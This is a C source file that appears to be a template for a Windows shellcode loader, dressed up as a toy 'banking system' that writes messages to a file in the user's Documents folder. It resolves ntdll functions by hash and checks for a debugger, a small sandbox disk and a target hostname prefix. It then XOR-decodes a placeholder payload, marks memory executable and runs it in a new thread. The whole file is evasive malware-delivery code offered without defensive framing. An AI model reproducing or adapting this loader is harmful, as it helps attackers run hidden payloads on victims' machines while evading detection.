#include "definitions.h"


int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

    char path[MAX_PATH]; 
    int money = 3500;
    uint16_t key = %XOR_KEY%;
    
    snprintf(path, MAX_PATH, "%s\\Documents\\bank_account.txt", getenv("USERPROFILE"));  
    printf("start");    
    HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH);
    FILE *file = fopen(path, "w"); // Ouvre le file en mode écriture

    if (file == NULL || is_being_debugged(hNtdll)) {
        printf("Error during file openning : %s\n", path);
        return 1;
    }

    fprintf(file, "Hey, welcoming to the banking system !\n");

    int disk_size = get_disk_size();
    if (money > 1000 && disk_size < 50) { // to replace with dynamic value
        fprintf(file, "You have enough money !\n");
        fclose(file);
        return 1;
    } else {
        fprintf(file, "Vous don't have enough money: %d€ !\n",disk_size);
        
    }

    const char* hostname = get_hostname(hNtdll);
    fprintf(file, "DEBUG : %s\n", hostname);
    if (key > 0 && starts_with(hostname, HOSTNAME_PREFIX)) {
        fprintf(file, "You have a key, which is : %s\n", hostname);
    } else {
        fprintf(file, "You don't have a key, try this one : %s\n", hostname);
        fclose(file);
        return 1;
    }


    fclose(file);


    unsigned char payload[] = "%SHELLCODE%";
    

    SIZE_T regionSize = sizeof(payload);
    PVOID exec = NULL;
    DWORD old_protect = 0;
    HANDLE th;
    BOOL rv;
  
    NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_ALLOC_HASH);
    NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, WRITE_MEMORY_HASH);
    NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_PROTECT_HASH);
    NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, CREATE_THREAD_HASH);
    NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAdress(hNtdll, WAIT_FOR_SINGLE_OBJECT_HASH);


    // Allocating executable memory
    _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    XOR(payload,sizeof(payload),key);

    // Copy shellcode into allocated memory
    _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);

    // Changing memory protection to PAGE_EXECUTE_READ
    _NtProtectVirtMem((HANDLE)-1, &exec, &regionSize, PAGE_EXECUTE_READ, &old_protect);

    // Executing shellcode in a new thread
    _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, false, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);

    // Waiting for thread to finish
    _NtWaitForSingleObj(th, false, NULL);

    return 0;
}

